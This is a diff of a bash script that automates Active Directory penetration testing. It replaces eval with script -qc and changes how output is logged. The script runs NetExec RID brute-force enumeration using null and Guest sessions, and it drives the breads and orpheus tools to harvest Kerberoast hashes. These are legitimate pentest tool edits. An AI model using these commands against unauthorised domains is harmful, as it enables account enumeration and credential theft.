@@ -201,7 +201,7 @@ set -- "${args[@]}"
 
 run_command () {
     echo "$(date +%Y-%m-%d\ %H:%M:%S); $@" >> $command_log
-    eval "$@"
+    /usr/bin/script -qc "$@"
 }
 
 prepare (){
@@ -1289,7 +1289,7 @@ breads_console (){
             echo -e "${BLUE}[*] Launching breads${NC}"
             rm -rf "${HOME}/.breads/${user}_${dc_domain}" 2>/dev/null
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt" >> $command_log
-            (echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n${password}${hash}\ncurrent_profile"; cat /dev/tty) | ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt
+            (echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n${password}${hash}\ncurrent_profile"; cat /dev/tty) | /usr/bin/script -qc ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1647,9 +1647,9 @@ certsync_ntds_dump () {
 ridbrute_attack () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute" 2>&1 >> ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
-        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute" 2>&1 >> ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
-        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute" 2>&1 >> ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
+        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
+        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
+        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
         #Parsing user lists
         /bin/cat ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
@@ -1869,7 +1869,7 @@ kerborpheus_attack () {
             current_dir=$(pwd)
             cd ${scripts_dir}/orpheus-main
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt" >> $command_log
-            (echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"; cat /dev/tty) | ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt
+            (echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"; cat /dev/tty) | /usr/bin/script -qc ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt
             cd ${current_dir}
         fi
     fi 
